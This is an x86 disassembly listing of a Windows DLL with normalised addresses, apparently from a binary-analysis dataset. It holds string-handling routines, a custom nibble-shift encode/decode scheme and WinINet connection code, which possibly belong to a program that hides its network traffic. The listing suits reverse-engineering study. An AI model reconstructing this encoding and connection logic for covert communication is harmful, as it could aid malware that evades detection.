mov [ edi + 0x4 ] bl
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0x10
retn 0x4
mov eax [ edi + 0x4 ]
push eax
call sub_1000c4b4
add esp 0x4
sub_1000aad0
push 0xffffffff
push sub_1001e040
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x40 ] eax
push ebx
push ebp
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x54 ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x64 ]
mov esi ecx
mov [ esp + 0x14 ] eax
xor ebx ebx
mov eax esi
mov [ esp + 0x4c ] 0xf
mov [ esp + 0x48 ] ebx
mov [ esp + 0x38 ] bl
lea ebp [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax ebp
push eax
push esi
lea ecx [ esp + 0x3c ]
call sub_10009630
mov [ esp + 0x5c ] ebx
mov ebp 0xf
mov eax edi
mov [ esp + 0x30 ] ebp
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax esi
push eax
push edi
lea ecx [ esp + 0x20 ]
call sub_10009630
lea ecx [ esp + 0x18 ]
push ecx
mov ecx [ esp + 0x18 ]
lea edx [ esp + 0x38 ]
push edx
mov [ esp + 0x64 ] 0x1
call sub_1000abe0
mov esi 0x10
mov [ esp + 0x5c ] bl
cmp [ esp + 0x30 ] esi
jb r-xdata
mov [ esp + 0x5c ] 0xffffffff
mov [ esp + 0x30 ] ebp
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
cmp [ esp + 0x4c ] esi
jb r-xdata
mov eax [ esp + 0x1c ]
push eax
call sub_1000c4b4
add esp 0x4
mov ecx [ esp + 0x54 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x40 ]
xor ecx esp
call sub_1000c0a5
add esp 0x50
retn 0x4
mov ecx [ esp + 0x38 ]
push ecx
call sub_1000c4b4
add esp 0x4
sub_1000abe0
push 0xffffffff
push sub_1001e004
mov eax [ fs : 0x0 ]
push eax
sub esp 0x84
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x98 ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0xa8 ]
mov esi ecx
push ebp
lea eax [ esp + 0x20 ]
add esi 0x1c
push eax
call sub_10008d90
mov edi [ eax ]
mov ecx [ esi + 0x18 ]
mov ebx [ eax + 0x4 ]
mov eax [ esi ]
mov [ esp + 0x18 ] ecx
test edi edi
je r-xdata
call sub_1000d90c
cmp edi eax
je r-xdata
mov eax [ esp + 0xac ]
push eax
push ebp
lea ecx [ esp + 0x68 ]
push ecx
call sub_10008e40
lea edx [ esp + 0x28 ]
push edx
mov edi eax
mov [ esp + 0xa4 ] 0x0
call sub_1000a260
lea eax [ esp + 0x28 ]
push eax
lea ecx [ esp + 0x20 ]
push ecx
push esi
mov [ esp + 0xac ] 0x1
call sub_10008bc0
lea edx [ esp + 0x28 ]
push edx
mov [ esp + 0xa4 ] 0x0
call sub_10004100
lea eax [ esp + 0x60 ]
push eax
mov [ esp + 0xa4 ] 0xffffffff
call sub_10004100
test edi edi
jne r-xdata
cmp ebx [ esp + 0x18 ]
je r-xdata
mov edi [ edi ]
jmp r-xdata
call sub_1000d90c
cmp ebx [ edi + 0x18 ]
jne r-xdata
mov edx [ esp + 0xac ]
push 0xffffffff
push 0x0
push edx
lea ecx [ ebx + 0x28 ]
call sub_10008f60
jmp r-xdata
call sub_1000d90c
mov ecx [ esp + 0x98 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x90
retn 0x8
sub_1000ad00
push 0xffffffff
push sub_1001dfc0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x40 ] eax
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x54 ]
mov [ fs : 0x0 ] eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x54 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
mov ecx [ esp + 0x40 ]
xor ecx esp
call sub_1000c0a5
add esp 0x50
retn
push 0x0
push r--data
mov ecx ebx
call sub_10009630
mov eax [ ebx + 0x34 ]
mov ebp [ ebx + 0x1c ]
mov eax [ eax ]
mov [ esp + 0x10 ] ebp
call sub_1000d90c
cmp ebp eax
je r-xdata
mov eax 0x1
cmp [ ebx + 0x14 ] 0x0
je r-xdata
cmp edi esi
je r-xdata
test ebp ebp
jne r-xdata
push 0x2
push r--data
mov eax ebx
call sub_10009520
mov eax [ ebp ]
jmp r-xdata
call sub_1000d90c
xor eax eax
cmp edi [ eax + 0x18 ]
jne r-xdata
lea ebp [ edi + 0xc ]
lea eax [ esp + 0x18 ]
push ebp
push eax
call sub_1000b940
add esp 0x8
mov esi eax
mov [ esp + 0x5c ] 0x0
mov eax [ esp + 0x10 ]
test eax eax
jne r-xdata
call sub_1000d90c
mov eax [ eax ]
jmp r-xdata
call sub_1000d90c
xor eax eax
cmp edi [ eax + 0x18 ]
jne r-xdata
add ebp 0x1c
push ebp
lea ecx [ esp + 0x38 ]
push esi
push ecx
call sub_1000ba10
add esp 0xc
mov ebp 0x10
mov [ esp + 0x5c ] 0x2
cmp [ esp + 0x30 ] ebp
jb r-xdata
call sub_1000d90c
push 0x0
lea eax [ esp + 0x38 ]
push eax
or eax 0xffffffff
mov esi ebx
mov [ esp + 0x38 ] 0xf
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x24 ] 0x0
call sub_10009b40
mov [ esp + 0x5c ] 0xffffffff
cmp [ esp + 0x4c ] ebp
jb r-xdata
mov edx [ esp + 0x1c ]
push edx
call sub_1000c4b4
add esp 0x4
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov ecx [ esp + 0x38 ]
push ecx
call sub_1000c4b4
add esp 0x4
cmp [ edi + 0x45 ] 0x0
je r-xdata
call sub_1000d90c
mov ecx [ edi + 0x8 ]
cmp [ ecx + 0x45 ] 0x0
jne r-xdata
call sub_1000d90c
mov ebp [ esp + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x4 ]
cmp [ eax + 0x45 ] 0x0
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x45 ] 0x0
jne r-xdata
mov esi [ ebx + 0x34 ]
mov eax [ ebx + 0x1c ]
test ebp ebp
je r-xdata
mov ebp [ esp + 0x10 ]
jmp r-xdata
cmp edi [ eax + 0x8 ]
jne r-xdata
mov ebp [ esp + 0x10 ]
mov edi ecx
jmp r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
mov edi eax
mov edi eax
mov eax [ eax + 0x4 ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
sub_1000aef0
push 0xffffffff
push sub_1001e1f8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x60 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x78 ]
mov [ fs : 0x0 ] eax
mov ebx edx
xor edi edi
mov esi ecx
mov [ esp + 0x1c ] esi
mov [ esp + 0x18 ] ebx
cmp [ ebx + 0x14 ] edi
jne r-xdata
mov eax [ esi + 0x34 ]
mov ecx [ eax + 0x4 ]
add esi 0x1c
push ecx
mov ecx esi
call sub_10009190
mov eax [ esi + 0x18 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x18 ]
mov [ esi + 0x1c ] edi
mov [ eax ] eax
mov esi [ esi + 0x18 ]
mov [ esi + 0x8 ] esi
push edi
xor esi esi
push r--data
lea ecx [ esp + 0x60 ]
mov [ esp + 0x1c ] esi
mov [ esp + 0x78 ] 0xf
mov [ esp + 0x74 ] edi
mov [ esp + 0x64 ] 0x0
call sub_10009630
mov [ esp + 0x80 ] edi
mov eax [ ebx + 0x14 ]
cmp eax edi
jbe r-xdata
xor eax eax
jmp r-xdata
mov [ esp + 0x80 ] 0xffffffff
cmp [ esp + 0x70 ] 0x10
jb r-xdata
jmp r-xdata
mov ecx [ esp + 0x78 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x60 ]
xor ecx esp
call sub_1000c0a5
add esp 0x70
retn
mov eax 0x1
mov eax [ esp + 0x5c ]
push eax
call sub_1000c4b4
add esp 0x4
push 0x0
push r--data
lea ecx [ esp + 0x60 ]
call sub_10009630
xor ebp ebp
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jae r-xdata
push 0x1
push r--data
lea edx [ esp + 0x60 ]
push edx
call sub_10009040
mov edi eax
push 0xffffffff
lea ecx [ edi + 0x1 ]
lea esi [ esp + 0x40 ]
lea edx [ esp + 0x5c ]
call sub_10008b90
mov ebp eax
push edi
xor ecx ecx
lea esi [ esp + 0x24 ]
lea edx [ esp + 0x5c ]
mov [ esp + 0x84 ] 0x1
call sub_10008b90
mov ecx [ esp + 0x1c ]
push ebp
push eax
mov [ esp + 0x88 ] 0x2
call sub_1000abe0
mov esi 0x10
mov [ esp + 0x80 ] 0x1
cmp [ esp + 0x38 ] esi
jb r-xdata
jbe r-xdata
xor ebp ebp
mov edi 0xf
mov [ esp + 0x80 ] 0x0
mov [ esp + 0x38 ] edi
mov [ esp + 0x34 ] ebp
mov [ esp + 0x24 ] 0x0
cmp [ esp + 0x54 ] esi
jb r-xdata
mov eax [ esp + 0x24 ]
push eax
call sub_1000c4b4
add esp 0x4
mov edi 0x10
cmp [ ebx + 0x18 ] edi
jb r-xdata
call sub_1000d90c
mov edx [ esp + 0x14 ]
mov [ esp + 0x54 ] edi
mov [ esp + 0x50 ] ebp
mov [ esp + 0x40 ] 0x0
cmp edx [ ebx + 0x14 ]
jb r-xdata
mov ecx [ esp + 0x40 ]
push ecx
call sub_1000c4b4
add esp 0x4
lea eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
jmp r-xdata
mov esi [ esp + 0x14 ]
inc [ esp + 0x14 ]
mov ebx [ esp + 0x18 ]
test ebp ebp
je r-xdata
cmp bl 0x3b
je r-xdata
mov bl [ eax + esi ]
cmp bl 0x20
je r-xdata
mov esi [ esp + 0x14 ]
mov ebp 0x1
or edx 0xffffffff
sub edx [ esp + 0x6c ]
cmp edx 0x1
ja r-xdata
mov esi [ esp + 0x6c ]
inc esi
cmp esi 0xfffffffe
jbe r-xdata
call sub_1001c70e
mov eax [ esp + 0x70 ]
cmp eax esi
jae r-xdata
call sub_1001c70e
test esi esi
jne r-xdata
mov eax [ esp + 0x6c ]
push eax
push esi
lea ecx [ esp + 0x60 ]
call sub_10009c30
test esi esi
jbe r-xdata
cmp eax edi
mov eax [ esp + 0x5c ]
mov [ esp + 0x6c ] esi
jae r-xdata
mov eax [ esp + 0x5c ]
cmp [ esp + 0x70 ] edi
jae r-xdata
mov [ eax ] 0x0
jmp r-xdata
lea eax [ esp + 0x5c ]
mov ecx [ esp + 0x6c ]
mov [ eax + ecx ] bl
mov eax [ esp + 0x5c ]
mov [ esp + 0x6c ] esi
cmp [ esp + 0x70 ] edi
jae r-xdata
lea eax [ esp + 0x5c ]
mov [ eax + esi ] 0x0
jmp r-xdata
lea eax [ esp + 0x5c ]
sub_1000b1a0
push 0xffffffff
push sub_1001e588
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov eax ecx
mov edi edx
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x14 ] 0x0
lea esi [ eax + 0x1 ]
lea esp [ esp ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
push eax
push ecx
lea ecx [ esp + 0x18 ]
call sub_10009630
lea ecx [ esp + 0x10 ]
mov [ esp + 0x38 ] 0x0
call sub_1000b260
mov [ esp + 0x38 ] 0xffffffff
cmp [ esp + 0x28 ] 0x10
mov esi eax
jb r-xdata
mov eax esi
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x20 ]
xor ecx esp
call sub_1000c0a5
add esp 0x30
retn
mov eax [ esp + 0x14 ]
push eax
call sub_1000c4b4
add esp 0x4
sub_1000b260
push 0xffffffff
push sub_1001e54b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x824
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x820 ] eax
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x830 ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push 0x7ff
lea eax [ esp + 0x31 ]
push ebx
push eax
mov esi ecx
mov [ esp + 0x38 ] bl
call sub_1000fe10
add esp 0xc
push ebx
push r--data
lea ecx [ esp + 0x18 ]
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
call sub_10009630
mov [ esp + 0x838 ] ebx
cmp [ esi + 0x18 ] 0x10
jb r-xdata
lea ecx [ esi + 0x4 ]
mov ecx [ esi + 0x4 ]
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0x30 ]
push eax
lea ecx [ esp + 0x18 ]
call sub_10009630
lea edx [ esp + 0x10 ]
mov ecx edi
call sub_1000aef0
mov [ esp + 0x838 ] 0xffffffff
cmp [ esp + 0x28 ] 0x10
mov esi eax
jb r-xdata
lea edx [ esp + 0x2c ]
push edx
call sub_1000b870
lea eax [ esp + 0x2c ]
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov eax esi
mov ecx [ esp + 0x830 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ esp + 0x820 ]
xor ecx esp
call sub_1000c0a5
add esp 0x830
retn
mov ecx [ esp + 0x14 ]
push ecx
call sub_1000c4b4
add esp 0x4
sub_1000b370
push 0xffffffff
push sub_1001de11
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x28 ] eax
push ebx
push ebp
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x38 ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov [ esp + 0x10 ] ebx
mov eax r--data
mov [ esp + 0x14 ] esi
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
lea ebp [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax ebp
push eax
push r--data
lea ecx [ esp + 0x20 ]
call sub_10009630
mov ebp 0x1
push esi
lea eax [ esp + 0x1c ]
mov ecx edi
mov [ esp + 0x44 ] ebp
call sub_1000b430
mov [ esp + 0x40 ] bl
cmp [ esp + 0x30 ] 0x10
mov [ esp + 0x10 ] ebp
jb r-xdata
mov eax esi
mov ecx [ esp + 0x38 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebp
pop ebx
mov ecx [ esp + 0x28 ]
xor ecx esp
call sub_1000c0a5
add esp 0x38
retn
mov eax [ esp + 0x1c ]
push eax
call sub_1000c4b4
add esp 0x4
sub_1000b430
sub esp 0x10
push ebx
push ebp
mov ebp [ esp + 0x1c ]
push esi
push edi
mov esi ecx
push eax
lea ecx [ esp + 0x1c ]
add esi 0x1c
push ecx
mov [ esp + 0x2c ] 0x0
call sub_10008d90
mov edi [ eax ]
mov ebx [ eax + 0x4 ]
mov edx [ esi + 0x18 ]
mov eax [ esi ]
xor esi esi
mov [ esp + 0x14 ] edx
cmp edi esi
je r-xdata
call sub_1000d90c
cmp edi eax
je r-xdata
push esi
mov [ ebp + 0x18 ] 0xf
mov [ ebp + 0x14 ] esi
push r--data
mov ecx ebp
mov [ ebp + 0x4 ] 0x0
call sub_10009630
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
add esp 0x10
retn 0x4
cmp edi esi
jne r-xdata
cmp ebx [ esp + 0x14 ]
je r-xdata
mov edi [ edi ]
jmp r-xdata
call sub_1000d90c
xor edi edi
cmp ebx [ edi + 0x18 ]
jne r-xdata
push 0xffffffff
add ebx 0x28
push esi
mov [ ebp + 0x18 ] 0xf
mov [ ebp + 0x14 ] esi
push ebx
mov ecx ebp
mov [ ebp + 0x4 ] 0x0
call sub_10008f60
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn 0x4
call sub_1000d90c
sub_1000b4e0
push 0xffffffff
push sub_1001ddc8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x58 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x70 ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x80 ]
mov [ esp + 0x14 ] eax
xor ebx ebx
mov ebp 0xf
mov eax ecx
mov esi edx
mov [ esp + 0x4c ] ebp
mov [ esp + 0x48 ] ebx
mov [ esp + 0x38 ] bl
lea edi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax edi
push eax
push ecx
lea ecx [ esp + 0x3c ]
call sub_10009630
mov [ esp + 0x78 ] ebx
mov eax esi
mov [ esp + 0x30 ] ebp
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push esi
lea ecx [ esp + 0x20 ]
call sub_10009630
mov [ esp + 0x78 ] 0x1
push ebx
push r--data
lea ecx [ esp + 0x58 ]
mov [ esp + 0x70 ] ebp
mov [ esp + 0x6c ] ebx
mov [ esp + 0x5c ] bl
call sub_10009630
push 0x1
push r--data
lea eax [ esp + 0x20 ]
mov [ esp + 0x80 ] 0x2
call sub_10009520
mov edx [ esp + 0x1c ]
mov edi 0x10
cmp [ esp + 0x30 ] edi
jae r-xdata
mov eax edx
lea esi [ eax + 0x1 ]
lea edx [ esp + 0x1c ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax esi
push eax
push edx
lea ecx [ esp + 0x3c ]
push ecx
call sub_10009040
cmp eax 0xffffffff
jne r-xdata
mov edx [ esp + 0x2c ]
lea edi [ edx + eax ]
mov eax [ esp + 0x48 ]
cmp edi eax
jae r-xdata
mov [ esp + 0x78 ] 0x1
cmp [ esp + 0x68 ] edi
jb r-xdata
mov esi 0x10
jbe r-xdata
mov [ esp + 0x78 ] bl
mov [ esp + 0x68 ] ebp
mov [ esp + 0x64 ] ebx
mov [ esp + 0x54 ] bl
cmp [ esp + 0x30 ] edi
jb r-xdata
mov edx [ esp + 0x54 ]
push edx
call sub_1000c4b4
add esp 0x4
mov esi [ esp + 0x64 ]
push esi
push eax
mov eax [ esp + 0x1c ]
push eax
call sub_100109a0
mov ecx [ esp + 0x20 ]
mov [ esi + ecx ] bl
mov esi 0x10
add esp 0xc
mov [ esp + 0x78 ] 0x1
cmp edi esi
jb r-xdata
lea eax [ esp + 0x54 ]
mov ecx [ esp + 0x38 ]
mov esi 0x10
cmp [ esp + 0x4c ] esi
jae r-xdata
call sub_1000d90c
mov eax [ esp + 0x48 ]
mov [ esp + 0x78 ] 0xffffffff
mov [ esp + 0x30 ] ebp
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
cmp [ esp + 0x4c ] edi
jb r-xdata
mov eax [ esp + 0x1c ]
push eax
call sub_1000c4b4
add esp 0x4
mov edi 0xf
mov [ esp + 0x78 ] bl
mov [ esp + 0x68 ] edi
mov [ esp + 0x64 ] ebx
mov [ esp + 0x54 ] bl
cmp [ esp + 0x30 ] esi
jb r-xdata
push ebp
call sub_1000c4b4
add esp 0x4
cmp [ ecx + edi ] 0x3b
je r-xdata
lea ecx [ esp + 0x38 ]
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x38 ]
push ecx
call sub_1000c4b4
add esp 0x4
mov [ esp + 0x78 ] 0xffffffff
mov [ esp + 0x30 ] edi
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
cmp [ esp + 0x4c ] esi
jb r-xdata
mov edx [ esp + 0x1c ]
push edx
call sub_1000c4b4
add esp 0x4
mov edi [ esp + 0x68 ]
mov ebp [ esp + 0x54 ]
mov eax ebp
cmp edi esi
jae r-xdata
cmp edi eax
jbe r-xdata
mov ecx [ esp + 0x70 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x58 ]
xor ecx esp
call sub_1000c0a5
add esp 0x68
retn 0x4
mov eax 0x1
mov eax [ esp + 0x38 ]
push eax
call sub_1000c4b4
add esp 0x4
mov eax [ esp + 0x38 ]
cmp [ esp + 0x4c ] esi
jae r-xdata
call sub_1000d90c
mov bl [ eax + edi ]
lea esi [ esp + 0x50 ]
call sub_10008ed0
mov eax [ esp + 0x48 ]
inc edi
xor ebx ebx
cmp edi eax
jb r-xdata
lea eax [ esp + 0x38 ]
sub_1000b770
mov eax [ edi + 0x34 ]
mov ecx [ eax + 0x4 ]
push esi
lea esi [ edi + 0x1c ]
push ecx
mov ecx esi
call sub_10009190
mov eax [ esi + 0x18 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x18 ]
mov [ esi + 0x1c ] 0x0
mov [ eax ] eax
mov esi [ esi + 0x18 ]
push 0x0
push r--data
mov ecx edi
mov [ esi + 0x8 ] esi
call sub_10009630
pop esi
retn
sub_1000b7b0
sub esp 0x808
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x804 ] eax
mov eax [ esp + 0x80c ]
push ebp
push esi
push 0x7ff
lea ecx [ esp + 0x11 ]
push 0x0
push ecx
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] 0x0
call sub_1000fe10
mov eax edi
add esp 0xc
xor ecx ecx
xor esi esi
lea ebp [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ebp
test eax eax
jle r-xdata
lea eax [ esp + 0xc ]
pop esi
mov [ esp + ecx + 0x8 ] 0x0
lea edx [ eax + 0x1 ]
pop ebp
jmp r-xdata
mov al [ esi + edi ]
mov dl al
and al 0xf
shr dl 0x4
add al 0x7a
add dl 0x78
mov [ esp + ecx + 0xd ] al
mov [ esp + ecx + 0xc ] dl
mov eax edi
add ecx 0x2
inc esi
lea ebp [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ebp
cmp esi eax
jl r-xdata
sub eax edx
mov edx [ esp ]
push eax
lea ecx [ esp + 0x8 ]
call sub_10002640
mov ecx [ esp + 0x808 ]
add esp 0x4
xor ecx esp
call sub_1000c0a5
add esp 0x808
retn 0x4
sub_1000b870
sub esp 0x804
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x800 ] eax
push ebp
mov ebp [ esp + 0x80c ]
push esi
push edi
push 0x7ff
lea eax [ esp + 0x11 ]
push 0x0
push eax
mov esi ecx
mov [ esp + 0x18 ] 0x0
call sub_1000fe10
mov eax esi
add esp 0xc
lea ecx [ eax + 0x1 ]
mov edi edi
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
lea ecx [ esp + 0x10 ]
push ecx
mov ecx esi
call sub_10002920
lea eax [ esp + 0x14 ]
add esp 0x8
xor esi esi
xor ecx ecx
lea edi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
test eax eax
jle r-xdata
mov [ esi + ebp ] cl
mov al [ esp + ecx + 0xc ]
mov dl [ esp + ecx + 0xd ]
add dl 0x6
sub al 0x8
shl al 0x4
and dl 0xf
add dl al
mov [ esi + ebp ] dl
lea eax [ esp + 0xc ]
inc esi
add ecx 0x2
lea edi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
cmp ecx eax
jl r-xdata
mov [ esi + ebp ] dl
jmp r-xdata
mov ecx [ esp + 0x80c ]
pop edi
pop esi
pop ebp
xor ecx esp
call sub_1000c0a5
add esp 0x804
retn 0x4
sub_1000b940
push 0xffffffff
push sub_1001dd91
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x40 ]
mov eax [ esp + 0x44 ]
xor ebx ebx
push 0xffffffff
mov [ esp + 0x14 ] ebx
push ebx
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0x38 ] 0xf
mov [ esp + 0x34 ] ebx
mov [ esp + 0x24 ] bl
call sub_10008f60
mov eax r--data
mov [ esp + 0x38 ] 0x1
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push r--data
lea eax [ esp + 0x1c ]
call sub_10009520
push 0xffffffff
push ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push eax
mov ecx esi
mov [ esi + 0x4 ] bl
call sub_10008f60
mov [ esp + 0x38 ] bl
cmp [ esp + 0x2c ] 0x10
mov [ esp + 0x10 ] 0x1
jb r-xdata
mov eax esi
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0x2c
retn
mov ecx [ esp + 0x18 ]
push ecx
call sub_1000c4b4
add esp 0x4
sub_1000ba10
push 0xffffffff
push sub_1001dd91
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov edi [ esp + 0x40 ]
mov eax [ esp + 0x44 ]
xor ebx ebx
push 0xffffffff
mov [ esp + 0x14 ] ebx
push ebx
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0x38 ] 0xf
mov [ esp + 0x34 ] ebx
mov [ esp + 0x24 ] bl
call sub_10008f60
mov ecx [ esp + 0x48 ]
push ebx
push ecx
or eax 0xffffffff
lea esi [ esp + 0x1c ]
mov [ esp + 0x40 ] 0x1
call sub_10009b40
push 0xffffffff
push ebx
mov [ edi + 0x18 ] 0xf
mov [ edi + 0x14 ] ebx
push eax
mov ecx edi
mov [ edi + 0x4 ] bl
call sub_10008f60
mov [ esp + 0x38 ] bl
cmp [ esp + 0x2c ] 0x10
mov [ esp + 0x10 ] 0x1
jb r-xdata
mov eax edi
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0x2c
retn
mov edx [ esp + 0x18 ]
push edx
call sub_1000c4b4
add esp 0x4
sub_1000bad0
mov eax [ esi + 0x14218 ]
push edi
mov edi [ InternetCloseHandle@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x14214 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esi + 0x14218 ] 0x0
mov eax [ esi + 0x14210 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esi + 0x14214 ] 0x0
pop edi
retn
push eax
call edi
mov [ esi + 0x14210 ] 0x0
sub_1000bb20
push 0x0
push r--data
push r--data
push 0x0
push r--data
call [ InternetOpenA@IAT ]
mov [ esi + 0x14210 ] eax
test eax eax
jne r-xdata
mov eax 0x1
retn
mov eax [ esi + 0x14218 ]
push edi
mov edi [ InternetCloseHandle@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x14214 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esi + 0x14218 ] 0x0
mov eax [ esi + 0x14210 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esi + 0x14214 ] 0x0
xor eax eax
pop edi
retn
push eax
call edi
mov [ esi + 0x14210 ] 0x0
sub_1000bba0
mov edx [ esi + 0x14210 ]
push edi
mov edi eax
dec eax
neg eax
push 0x0
sbb eax eax
and eax 0xff800000
add eax 0x800000
push eax
push 0x3
push 0x0
push 0x0
push ecx
push rw-data
push edx
call [ InternetConnectA@IAT ]
mov [ esi + 0x14214 ] eax
test eax eax
jne r-xdata
mov [ esi + 0x1421c ] edi
mov eax 0x1
pop edi
retn
mov eax [ esi + 0x14218 ]
mov edi [ InternetCloseHandle@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x14214 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esi + 0x14218 ] 0x0
mov eax [ esi + 0x14210 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esi + 0x14214 ] 0x0
xor eax eax
pop edi
retn
push eax
call edi
mov [ esi + 0x14210 ] 0x0
sub_1000bc40
sub esp 0x8
push ebp
push edi
mov edi eax
mov eax [ esi + 0x14218 ]
xor ebp ebp
cmp eax ebp
je r-xdata
push ebp
cmp [ esi + 0x1421c ] ebp
je r-xdata
push eax
call [ InternetCloseHandle@IAT ]
mov [ esi + 0x14218 ] ebp
mov ecx [ esi + 0x14214 ]
push 0x84480000
push ebp
push ebp
push r--data
push edi
push ebx
push ecx
mov eax [ esi + 0x14214 ]
push 0x84c80000
push ebp
push ebp
